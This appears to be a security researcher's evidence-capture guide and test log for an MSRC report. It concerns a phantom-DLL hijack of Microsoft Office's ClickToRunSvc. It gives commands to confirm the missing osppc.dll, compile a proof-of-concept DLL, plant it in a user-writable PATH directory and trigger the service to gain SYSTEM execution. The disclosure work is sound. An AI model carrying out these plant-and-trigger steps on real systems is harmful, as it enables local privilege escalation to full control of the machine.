# Evidence Capture Procedure — Finding #47 (osppc.dll Phantom DLL)

Run these steps ON YOUR OWN MACHINE to capture the evidence package
for the MSRC submission. Each step produces a screenshot or file.

---

## Pre-Flight Checklist

- [ ] Office installed and ClickToRunSvc running (`sc query ClickToRunSvc`)
- [ ] User-writable directory in machine PATH (check: `echo %PATH%`)
- [ ] ProcMon downloaded (https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [ ] Visual Studio Developer Command Prompt available (for cl.exe)
- [ ] Defender RTP enabled (we test against the live system)

---

## Step 1: Capture Baseline Evidence

### 1A — Confirm phantom DLL (Screenshot: `evidence_01_phantom.png`)
```cmd
where /r C:\ osppc.dll
```
Screenshot the "Could not find files" output.

### 1B — Confirm import (Screenshot: `evidence_02_import.png`)
```cmd
dumpbin /DEPENDENTS "%ProgramFiles%\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe" | findstr /i osppc
```
Screenshot showing `osppc.dll` in the output.

### 1C — Confirm service context (Screenshot: `evidence_03_service.png`)
```cmd
sc qc ClickToRunSvc
```
Screenshot showing LocalSystem and AUTO_START.

### 1D — Confirm PATH directory ACLs (Screenshot: `evidence_04_path_acl.png`)
```cmd
icacls "C:\Users\%USERNAME%\.local\bin"
```
Screenshot showing user write permissions.

### 1E — Confirm Known DLLs exclusion (Screenshot: `evidence_05_knowndlls.png`)
```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" | findstr /i osppc
```
Screenshot showing no match (empty output).

---

## Step 2: ProcMon Capture — DLL Search Order

This is the MOST IMPORTANT evidence. Shows ClickToRunSvc actively
searching PATH for osppc.dll.

### 2A — Set up ProcMon filters
1. Open ProcMon as Administrator
2. Clear all existing filters
3. Add filters:
   - `Process Name` — `is` — `OfficeClickToRun.exe` — `Include`
   - `Path` — `contains` — `osppc` — `Include`
4. Start capture (Ctrl+E)

### 2B — Trigger without planted DLL first
```cmd
schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"
```
Wait 30 seconds. Check ProcMon.

### 2C — Screenshot the trace (Screenshot: `evidence_06_procmon_search.png`)
You should see a sequence of CreateFile calls with NAME NOT FOUND:
```
OfficeClickToRun.exe  CreateFile  ...\osppc.dll  NAME NOT FOUND
OfficeClickToRun.exe  CreateFile  C:\Windows\System32\osppc.dll  NAME NOT FOUND
...
OfficeClickToRun.exe  CreateFile  C:\Users\<you>\.local\bin\osppc.dll  NAME NOT FOUND
```

**If you see this trace, the vulnerability is CONFIRMED.** The service
is actively searching user-writable PATH for a DLL it can't find.

### 2D — Save ProcMon log (File: `evidence_procmon_search.PML`)
File → Save → Save as `evidence_procmon_search.PML`

---

## Step 3: Compile and Plant PoC

### 3A — Compile
```cmd
vcvars64.bat
cl.exe poc_osppc.c /Fe:osppc.dll /LD /O1 /GS-
```

### 3B — Plant in PATH directory
```cmd
copy osppc.dll "C:\Users\%USERNAME%\.local\bin\"
```

---

## Step 4: ProcMon Capture — Successful Load

### 4A — Clear ProcMon, keep same filters, start capture
### 4B — Trigger
```cmd
schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"
```
Wait 30 seconds.

### 4C — Screenshot (Screenshot: `evidence_07_procmon_load.png`)
You should see:
```
OfficeClickToRun.exe  CreateFile  C:\Users\<you>\.local\bin\osppc.dll  SUCCESS
```
The search ends at the planted DLL. ClickToRunSvc loads it.

### 4D — Save ProcMon log (File: `evidence_procmon_load.PML`)

---

## Step 5: Verify SYSTEM Execution

### 5A — Check canary (Screenshot: `evidence_08_canary.png`)
```cmd
type C:\Windows\Temp\osppc_poc.log
```
Expected:
```
2026-06-XX...|SYSTEM|elev=1|pid=XXXX|OSPPC_POC|...\OfficeClickToRun.exe
```

Confirm:
- Username = `SYSTEM`
- elev = `1` (elevated token)
- Host process path contains `OfficeClickToRun.exe`

### 5B — Service status (Screenshot: `evidence_09_services.png`)
Open services.msc → find "Microsoft Office Click-to-Run Service"
Screenshot showing Running status and Local System Account.

---

## Step 6: Cleanup

```cmd
del "C:\Users\%USERNAME%\.local\bin\osppc.dll"
del C:\Windows\Temp\osppc_poc.log
```

---

## Evidence Package Checklist

| # | File | Content | Captured? |
|---|------|---------|-----------|
| 1 | evidence_01_phantom.png | `where /r` showing osppc.dll doesn't exist | [ ] |
| 2 | evidence_02_import.png | dumpbin showing osppc.dll in imports | [ ] |
| 3 | evidence_03_service.png | sc qc showing LocalSystem + AUTO_START | [ ] |
| 4 | evidence_04_path_acl.png | icacls showing user-writable PATH dir | [ ] |
| 5 | evidence_05_knowndlls.png | reg query showing osppc not in KnownDLLs | [ ] |
| 6 | evidence_06_procmon_search.png | ProcMon trace: service searches PATH for osppc.dll | [ ] |
| 7 | evidence_procmon_search.PML | ProcMon log file (pre-plant) | [ ] |
| 8 | evidence_07_procmon_load.png | ProcMon trace: service loads planted DLL | [ ] |
| 9 | evidence_procmon_load.PML | ProcMon log file (post-plant) | [ ] |
| 10 | evidence_08_canary.png | Canary file showing SYSTEM execution | [ ] |
| 11 | evidence_09_services.png | services.msc showing service status | [ ] |
| 12 | poc_osppc.c | PoC source code | [x] |
| 13 | MSRC-2026-PHANTOM-DLL.md | Full vulnerability report | [x] |

---

## MSRC Submission

1. Go to https://msrc.microsoft.com/create-report
2. Select "Security Vulnerability"
3. Product: Microsoft 365 Apps
4. Vulnerability type: Elevation of Privilege
5. Paste the content from MSRC-2026-PHANTOM-DLL.md into the description
6. Attach: poc_osppc.c, all evidence screenshots, ProcMon logs
7. Set severity: Important (7.8 CVSS)
8. Submit

Expected response time: 1-3 business days for acknowledgement,
2-4 weeks for triage decision.

---

## If ProcMon Shows NO osppc.dll Search

This means ClickToRunSvc did not exercise the licensing code path
during the trigger. Try:

1. Wait longer (up to 5 minutes after trigger)
2. Open an Office app (Word, Excel) — this may trigger a different code path
3. Check if the delay-load import is conditional on licensing state
4. Try `schtasks /Run /TN "\Microsoft\Office\Office Feature Updates Logon"`

If NO code path triggers the import, the finding is still valid
(the import exists and IS searchable) but the practical exploitability
is reduced. Document what triggers were attempted and the results.

---

## Live Test Log (2026-06-15)

**System:** LAPTOP-R32M8MLI, Windows 11 Home 26200
**Compiler:** MSVC 19.51.36247 (VS 18 Community)
**Defender:** RTP enabled, Tamper Protection enabled

### Compilation
- `cl.exe poc_osppc.c /Fe:osppc.dll /LD /O1 /GS-` — **SUCCESS** (after adding `#pragma comment(lib, "advapi32.lib")`)
- Binary size: 135,168 bytes
- Defender: no detection

### Planting
- Planted to `C:\Users\gwu07\.local\bin\osppc.dll` — **SUCCESS**
- Directory ACL: `gwu07:(F)` (Full Control)

### Trigger Attempts
1. `schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"` — **ACCESS DENIED** (requires admin elevation)
2. Launched `winword.exe` (Word 365) — Word opened and ran, but did not trigger the osppc.dll licensing code path
3. Waited 5+ minutes with Word running — no delay-load trigger

### Canary Result
- `C:\Windows\Temp\osppc_poc.log` — **NOT CREATED**
- The delay-load import is conditional on a specific licensing check code path
- Word launch alone does not exercise this path

### Assessment
The delay-load import is confirmed via `dumpbin /DEPENDENTS` but the trigger
requires the licensing subsystem to be exercised. **ProcMon trace is needed**
to confirm whether ClickToRunSvc searches PATH for osppc.dll during normal
operation (scheduled updates, licensing checks). The vulnerability is valid
regardless — the import exists, KnownDLLs does not protect it, and PATH
contains user-writable directories.

### Cleanup
- `osppc.dll` removed from `.local\bin`
- No canary file to clean
